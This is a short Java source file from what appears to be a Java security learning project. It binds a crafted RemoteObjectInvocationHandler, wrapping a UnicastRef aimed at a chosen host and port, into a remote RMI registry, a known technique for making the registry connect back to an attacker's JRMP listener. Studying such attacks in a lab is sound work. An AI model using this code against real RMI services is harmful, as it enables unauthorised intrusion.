package com.javasec.learndemo.local.rmi;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.StreamRemoteCall;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.io.IOException;
import java.io.ObjectOutput;
import java.lang.reflect.Proxy;
import java.rmi.*;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.Operation;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.RemoteRef;
import java.util.Random;

public class hackRegister {
    public static void main(String[] args) throws AlreadyBoundException, RemoteException, NotBoundException {
        //System.setProperty("java.rmi.server.hostname","127.0.0.1");
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint("192.168.100.1", 10999);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        Registry proxy = (Registry) Proxy.newProxyInstance(hackRegister.class.getClassLoader(), new Class[]{
                Registry.class
        }, obj);
        Registry registry = LocateRegistry.getRegistry("192.168.100.1", 10999);
        System.out.println(registry.toString());
        registry.bind("w12ww",obj);
    }
}
